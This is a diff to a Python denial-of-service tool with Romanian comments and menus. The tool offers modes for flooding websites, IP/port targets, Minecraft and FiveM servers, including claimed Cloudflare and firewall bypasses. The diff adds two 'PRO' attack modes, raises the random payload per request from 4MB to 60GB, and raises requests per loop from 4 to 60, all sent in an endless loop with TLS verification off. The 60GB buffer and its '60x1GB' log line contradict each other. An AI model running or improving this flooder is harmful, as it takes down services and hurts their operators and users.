@@ -65,8 +65,10 @@ print("\033[93m| \033[94m3.  \033[93m| \033[95mLayer 7 Bypass Cloudflare/Firewal
 print("\033[93m| \033[94m4.  \033[93m| \033[95mLayer 4 Bypass Firewall (TCP/UDP) pentru IP și port |\033")
 print("\033[93m| \033[94m5.  \033[93m| \033[95mMinecraft Server Attack (TCP/UDP) pentru IP și port |\033")
 print("\033[93m| \033[94m6.  \033[93m| \033[95mFiveM Server Attack (TCP/UDP) pentru IP și port    |\033")
+print("\033[93m| \033[94m7.  \033[93m| \033[95mLayer 7 PRO (HTTP/HTTPS) pentru URL                 |\033")
+print("\033[93m| \033[94m8.  \033[93m| \033[95mLayer 4 PRO (TCP/UDP) pentru IP și port           |\033")
 print("\033[93m+---------------------------------------------------------------+\033")
-mode = input("\033[96mIntrodu numărul modului (1-6): \033")
+mode = input("\033[96mIntrodu numărul modului (1-8): \033")
 
 target_url = ""
 target_ip = ""
@@ -111,8 +113,8 @@ def get_random_headers():
     return headers
 
 def generate_large_data():
-    # Generează date aleatorii de aproximativ 4MB pentru un impact mai mare
-    return os.urandom(4 * 1024 * 1024)  # 4MB de date aleatorii
+    # Generează date aleatorii de aproximativ 60GB pentru un impact mai mare
+    return os.urandom(60 * 1024 * 1024 * 1024)  # 60GB de date aleatorii
 
 def minecraft_ping(ip, port):
     # Minecraft server ping cu date foarte mari
@@ -132,7 +134,7 @@ def layer7_attack():
     while True:
         try:
             headers = get_random_headers()
-            for _ in range(4):
+            for _ in range(60):  # Trimite 60 de cereri
                 large_data = generate_large_data()
                 req_type = random.randint(1,6)
                 if req_type == 1:
@@ -140,7 +142,6 @@ def layer7_attack():
                 elif req_type == 2:
                     requests.put(target_url, headers=headers, data=large_data, timeout=2, verify=False)
                 elif req_type == 3:
-                    # Pentru layer 7, nu folosim minecraft_ping
                     requests.get(target_url, headers=headers, timeout=2, verify=False)
                 elif req_type == 4:
                     session = requests.Session()
@@ -151,7 +152,7 @@ def layer7_attack():
                     requests.head(target_url, headers=headers, timeout=2, verify=False)
                 else:
                     requests.options(target_url, headers=headers, timeout=2, verify=False)
-            print(f"Layer 7: Trimis pachet de date: ~16MB (4x4MB)")
+            print(f"Layer 7: Trimis pachet de date: ~60GB (60x1GB)")
         except Exception as e:
             pass
 
